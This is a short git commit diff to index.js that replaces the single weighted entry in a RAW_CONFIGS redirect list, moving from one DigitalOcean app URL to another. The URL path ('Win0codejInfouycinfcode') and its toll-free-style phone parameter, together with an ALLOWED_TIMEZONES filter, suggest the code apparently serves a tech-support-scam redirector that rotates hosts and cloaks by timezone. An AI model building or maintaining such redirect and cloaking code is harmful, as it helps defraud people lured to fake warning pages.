acc2fc862f2e42e4fc332ac6b72e651e872d46c2
paalakash <palaksh452@gmail.com>
2026-06-14 13:28:44 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seal-app-9t4bu.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3420", weight: 1.0 }
+    { url: "https://sea-lion-app-vv7ch.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3420", weight: 1.0 }
 
 ];
 
